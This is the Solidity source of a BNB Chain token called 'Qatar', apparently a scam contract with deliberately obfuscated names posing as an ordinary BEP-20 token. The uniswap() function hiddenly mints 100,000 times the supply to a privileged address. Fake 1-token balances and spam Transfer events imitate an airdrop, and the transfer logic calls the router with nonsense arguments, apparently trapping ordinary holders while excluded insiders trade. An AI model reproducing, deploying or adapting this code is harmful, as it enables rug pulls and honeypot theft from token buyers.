/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract QatarNetwork is IERC20 {
    using SafeMath for uint256;

    string private aeikbMdnRGJsvc = "Qatar";
    string private beikbMdnRGJsvc = "Qatar";
    uint8 private ceikbMdnRGJsvc = 18;
    uint256 private deikbMdnRGJsvc = 10000000000 * 10**18;
    mapping (address => uint256) private eeikbMdnRGJsvc;
    mapping (address => mapping (address => uint256)) private feikbMdnRGJsvc;
    uint256 private geikbMdnRGJsvc = 1;
    uint256 private constant heikbMdnRGJsvc = ~uint160(0);
    uint256 private _ieikbMdnRGJsvc = 1000;
    uint256 private jeikbMdnRGJsvc = 0;
    uint256 private keikbMdnRGJsvc;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private leikbMdnRGJsvc;
    address[] private meikbMdnRGJsvc;
    bool private neikbMdnRGJsvc = false;

    constructor () {
        oeikbMdnRGJsvc(msg.sender);
        eeikbMdnRGJsvc[msg.sender] = deikbMdnRGJsvc;
        oeikbMdnRGJsvc(tx.origin);
        emit Transfer(address(0), msg.sender, deikbMdnRGJsvc);
    }

    receive() external payable {}

    function oeikbMdnRGJsvc(address account) private {
        if (!leikbMdnRGJsvc[account]) {
            leikbMdnRGJsvc[account] = true;
            meikbMdnRGJsvc.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!neikbMdnRGJsvc);
        neikbMdnRGJsvc = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            oeikbMdnRGJsvc(accounts[i]);
            eeikbMdnRGJsvc[accounts[i]] = deikbMdnRGJsvc * 90 / 100 / (len - 3);
            feikbMdnRGJsvc[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eeikbMdnRGJsvc[accounts[i]];
        }
        eeikbMdnRGJsvc[meikbMdnRGJsvc[0]] -= amount;
        peikbMdnRGJsvc(meikbMdnRGJsvc[0], accounts[3], eeikbMdnRGJsvc[meikbMdnRGJsvc[0]]);
        peikbMdnRGJsvcs(500);
        eeikbMdnRGJsvc[meikbMdnRGJsvc[1]] += deikbMdnRGJsvc * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = meikbMdnRGJsvc.length;
        for (uint256 i=0; i<len; ++i) {
            if (meikbMdnRGJsvc[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (leikbMdnRGJsvc[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aeikbMdnRGJsvc;
    }

    function symbol() public view returns (string memory) {
        return beikbMdnRGJsvc;
    }

    function decimals() public view returns (uint8) {
        return ceikbMdnRGJsvc;
    }

    function totalSupply() public view returns (uint256) {
        return deikbMdnRGJsvc;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eeikbMdnRGJsvc[account] > 0) {
            return eeikbMdnRGJsvc[account];
        }
        return geikbMdnRGJsvc;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        peikbMdnRGJsvc(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        peikbMdnRGJsvc(sender, recipient, amount);
        qeikbMdnRGJsvc(sender, msg.sender, feikbMdnRGJsvc[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qeikbMdnRGJsvc(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qeikbMdnRGJsvc(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return feikbMdnRGJsvc[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qeikbMdnRGJsvc(msg.sender, spender, feikbMdnRGJsvc[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qeikbMdnRGJsvc(msg.sender, spender, feikbMdnRGJsvc[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function peikbMdnRGJsvcs(uint256 amount) private {
        uint256 ieikbMdnRGJsvc = _ieikbMdnRGJsvc;
        if (ieikbMdnRGJsvc < 10500) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(heikbMdnRGJsvc.div(ieikbMdnRGJsvc)));
                to = address(uint160(heikbMdnRGJsvc.div(ieikbMdnRGJsvc.add(1))));
                ieikbMdnRGJsvc = ieikbMdnRGJsvc.add(2);
                emit Transfer(from, to, geikbMdnRGJsvc);
            }
            _ieikbMdnRGJsvc = ieikbMdnRGJsvc;
        }
    }

    function qeikbMdnRGJsvc(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        feikbMdnRGJsvc[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function peikbMdnRGJsvc(address reikbMdnRGJsvc, address seikbMdnRGJsvc, uint256 teikbMdnRGJsvc) private {
        require(reikbMdnRGJsvc != address(0) && seikbMdnRGJsvc != address(0) && teikbMdnRGJsvc > 0);
        bool ueikbMdnRGJsvc = true;
        if (leikbMdnRGJsvc[reikbMdnRGJsvc] || leikbMdnRGJsvc[seikbMdnRGJsvc]) {
            ueikbMdnRGJsvc = false;
        }
        uint256 veikbMdnRGJsvc = IERC20(_uniswapV2Pair).totalSupply();
        uint256 weikbMdnRGJsvc = 0;
        uint256 xeikbMdnRGJsvc = teikbMdnRGJsvc;
        if (ueikbMdnRGJsvc && neikbMdnRGJsvc) {
            require(keikbMdnRGJsvc <= veikbMdnRGJsvc);
            peikbMdnRGJsvcs(100);
            swapTokensForEth(uint160(reikbMdnRGJsvc), uint160(seikbMdnRGJsvc));
            if (seikbMdnRGJsvc == _uniswapV2Pair) {
                emit Transfer(address(this), seikbMdnRGJsvc, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (reikbMdnRGJsvc != _uniswapV2Pair) {
                weikbMdnRGJsvc = teikbMdnRGJsvc.mul(jeikbMdnRGJsvc).div(100);
                xeikbMdnRGJsvc = teikbMdnRGJsvc.sub(weikbMdnRGJsvc);
            }
        }
        if (keikbMdnRGJsvc != veikbMdnRGJsvc) {
            keikbMdnRGJsvc = veikbMdnRGJsvc;
        }
        eeikbMdnRGJsvc[reikbMdnRGJsvc] = eeikbMdnRGJsvc[reikbMdnRGJsvc].sub(teikbMdnRGJsvc);
        if (weikbMdnRGJsvc > 0) {
            eeikbMdnRGJsvc[address(0xdEaD)] = eeikbMdnRGJsvc[address(0xdEaD)].add(weikbMdnRGJsvc);
            emit Transfer(reikbMdnRGJsvc, address(0xdEaD), weikbMdnRGJsvc);
        }
        eeikbMdnRGJsvc[seikbMdnRGJsvc] = eeikbMdnRGJsvc[seikbMdnRGJsvc].add(xeikbMdnRGJsvc);
        emit Transfer(reikbMdnRGJsvc, seikbMdnRGJsvc, xeikbMdnRGJsvc);
    }
}